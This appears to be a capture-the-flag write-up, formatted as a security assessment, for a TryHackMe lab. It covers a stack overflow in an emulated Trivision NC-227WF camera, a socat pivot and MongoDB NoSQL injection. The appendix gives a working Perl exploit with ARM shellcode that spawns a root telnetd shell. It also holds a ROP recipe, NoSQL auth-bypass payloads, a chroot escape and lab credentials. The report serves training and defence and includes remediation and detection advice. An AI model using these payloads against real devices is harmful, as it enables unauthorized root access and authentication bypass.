# Security Assessment Report: Armageddon2r (Snowy ARMageddon)

## Assessment Overview

- **Platform:** TryHackMe
- **Target:** 10.129.152.195 (rotates)
- **Room Type:** guided_questions (Insane difficulty)
- **Date Solved:** 2026-04-22

**Objectives & Status:**

- [x] What is the content of the first flag?
- [x] What is the content of the yetikey2.txt file?

---

## Executive Summary & Key Findings

A Trivision NC-227WF IP camera running in a QEMU ARM emulator (port 50628) is vulnerable to a stack buffer overflow in its web server. Exploiting this overflow grants root shell access on the camera, where credentials for the camera web UI are stored. Pivoting through the camera via socat reveals an internal Apache/MongoDB web app (port 8080) vulnerable to NoSQL injection, enabling authentication bypass and access to the second flag.

- **Exposed Services:** SSH (22), tcpwrapped/telnet (23), Apache 2.4.57 (8080), Trivision NC-227WF camera (50628)
- **Interesting Paths:** `/form/liveRedirect?lang=`, `/en/login.asp?basic=`, `/var/etc/umconfig.txt`, `/login.php/`
- **Credentials Discovered:** `admin:Y3tiStarCur!ouspassword=admin` (camera), `Frosteau:HoHoHacked` (web app)
- **Users Enumerated:** admin (camera), Frosteau (web app), plus 17 other NoSQL-enumerated users
- **Loot & Flags:**
  - `THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
  - `2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK`

---

## Exploitation Chain

1. **Reconnaissance:** nmap reveals SSH (22), telnet (23), Apache on 8080 (403 externally), and a Trivision NC-227WF IP camera on port 50628.
2. **Initial Access — Camera Buffer Overflow:** The camera's web server copies the `lang` parameter (or `basic` parameter) from the URL into a fixed 256-byte stack buffer without bounds checking. A crafted HTTP request with 284+ bytes of padding followed by a ROP chain overwrites the return address and executes arbitrary ARM shellcode, spawning a root bind shell on port 23.
3. **Credential Discovery:** Inside the camera shell, `/var/etc/umconfig.txt` contains `admin:Y3tiStarCur!ouspassword=admin`. Logging into the camera web UI reveals the first flag on the MJPEG stream page.
4. **Pivoting — Socat:** The camera runs in QEMU alongside an internal web app (172.18.0.x:8080). Using `pkill webs; socat -v -v tcp-listen:50628,fork,reuseaddr tcp:172.18.0.x:8080` re-exposes the internal web app on port 50628 with the camera's Basic Auth as a gateway.
5. **Post-Exploitation — NoSQL Injection:** The internal login page (`/login.php/`) uses MongoDB. Authentication bypass via `username[$regex]=Frosteau&password[$regex]=.*` grants access. User enumeration via `$nin` operator reveals "Frosteau" whose dashboard contains `yetikey2.txt`.

---

## Vulnerability Details

### VULN-01: Trivision NC-227WF Stack Buffer Overflow (ARM)

- **Vulnerable Location:** Port 50628, `/form/liveRedirect?lang=` and `/en/login.asp?basic=`
- **Overview:** The camera web server copies user-supplied URL parameter values into a 256-byte stack buffer without any length validation. An attacker can overflow the buffer, overwrite saved registers (r4-r10, PC), and redirect execution via a ROP chain.
- **Impact:** Unauthenticated remote code execution as root on the ARM-based camera (QEMU emulated ARMv5).
- **Severity:** Critical (CWE-121, no authentication required, full system compromise)
- **Remediation:** Validate input length before copying to stack; use `strncpy` or equivalent bounded copy functions; enable stack canaries and NX if the architecture supports it.
- **Proof of Impact (Execution):**
  - ROP chain uses `system()` at `0x4006079c` (libc base `0x40021000`) to execute `telnetd${IFS}-l/bin/sh;#`, spawning a root bind shell on port 23.
  - Alternative shellcode approach uses `bx sp` gadget (`libgcc+0x2f88`) to jump to reverse shell shellcode on the stack.
  - Bad characters: `\x00\x09\x0a\x0d\x20\x23\x26` (null, tab, newline, carriage return, space, hash, ampersand).
  - Credentials extracted from `/var/etc/umconfig.txt`: `admin:Y3tiStarCur!ouspassword=admin`.

### VULN-02: NoSQL Injection in MongoDB-Backed Login

- **Vulnerable Location:** Port 8080, `/login.php/` (accessible via camera pivot)
- **Overview:** The PHP login form uses MongoDB for authentication. The application passes user input directly to a MongoDB query without sanitization, allowing NoSQL operator injection (`$regex`, `$ne`, `$nin`).
- **Impact:** Authentication bypass and user enumeration. Enables unauthorized access to user dashboards containing sensitive data.
- **Severity:** High (CWE-89, authentication bypass, data exposure)
- **Remediation:** Sanitize all user inputs; cast form data to strings before MongoDB queries; use schema validation; implement rate limiting on login attempts.
- **Proof of Impact (Execution):**
  - Bypass: `username[$ne]=test&password[$ne]=test` grants authenticated session.
  - User enumeration: `username[$nin][]=KnownUser1&username[$nin][]=KnownUser2` reveals all usernames.
  - Targeted login: `username[$regex]=Frosteau&password[$regex]=.*` logs in as Frosteau.
  - Second flag found on Frosteau's dashboard: `2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK`.

---

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways

- **ARM exploitation requires architecture-specific gadgets.** The ROP chain must account for ARM calling conventions (r0 for first arg, bx/blx for branching) and bad characters in the URL parameter. The `${IFS}` shell variable trick bypasses space restrictions in the command string.
- **Pivoting through IoT devices is a real attack vector.** Compromised cameras, routers, and other embedded devices often provide network bridging into isolated segments. In this case, the QEMU camera bridged the external network to an internal Docker network hosting the web app.
- **NoSQL injection is underrated.** MongoDB-backed applications that don't sanitize operator inputs are as vulnerable as SQL-injectable apps. The `$regex`, `$ne`, and `$nin` operators make authentication bypass and data enumeration trivial.

### Real-World Context & Defense

- **Threat Landscape:** IoT devices with unpatched firmware are routinely exploited in botnets (Mirai, Mozi) and as pivot points into enterprise networks. The Trivision NC-227WF has known CVEs (CVE-2025-1738, CVE-2025-1739) for authentication bypass and credential exposure.
- **Detection Engineering:** Monitor for oversized URL parameters (>256 bytes) on embedded device web servers; detect NoSQL operator strings (`$ne`, `$regex`, `$nin`) in HTTP POST bodies; alert on unexpected `telnetd` processes on IoT devices; log socat/port-forwarding commands on compromised hosts.
- **System Hardening:** Segment IoT devices into dedicated VLANs; disable unnecessary services (telnetd) on embedded devices; enforce input validation on all web-facing parameters; update firmware to patches that address buffer overflow and auth bypass CVEs; require strong, non-default credentials on all IoT devices.

---

## Technical Appendix: Commands Worth Keeping

```bash
# Recon
nmap -sSVC -T4 -p- --open 10.129.x.x -oA snowy_nmap

# Camera buffer overflow — Perl PoC (opens telnetd)
perl -e '
$libc = 0x40021000;
$shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x0b\x27\x24\x1b\x06\xa1\x08\xa2\x90\x1c\x04\xa3\xcc\x71\x54\x72\x1c\x80\x9c\x70\x16\xb4\x69\x46\x92\x1a\x18\x47\xff\xff\x0f\xeftelnetdX-l/bin/shX";
$buf = "A" x 284;
$buf .= pack("V", $libc + 0x00044684);
$req = "GET /form/liveRedirect?lang=${buf} HTTP/1.0\nHost: B${shellcode}\nUser-Agent: ARM/exploitlab\n\n";
print $req;
' | nc <TARGET> 50628

# Camera buffer overflow — Python ROP chain (system() call)
# buf = "A" * 284 + ldr_r0_sp + "BBBB" + "CCCC" + system + mov_r0 + "telnetd${IFS}-l/bin/sh;#"

# Telnet into camera shell after exploit
telnet <TARGET> 23

# Find credentials
cat /var/etc/umconfig.txt

# Pivot via socat (inside camera shell)
pkill webs; socat -v -v tcp-listen:50628,fork,reuseaddr tcp:172.18.0.x:8080

# Access internal web app through pivot
curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://<TARGET>:50628/ -L

# NoSQL injection — auth bypass
curl -X POST http://<TARGET>:8080/login.php/123 \
  -d 'username[$ne]=test&password[$ne]=test' -L -v

# NoSQL injection — login as Frosteau
curl -X POST http://<TARGET>:8080/login.php/123 \
  -d 'username[$regex]=Frosteau&password[$regex]=.*' -L -v

# Chroot escape from QEMU camera
LD_LIBRARY_PATH="/proc/1/root/usr/lib:$LD_LIBRARY_PATH" /proc/1/root/usr/sbin/chroot /proc/1/root
```
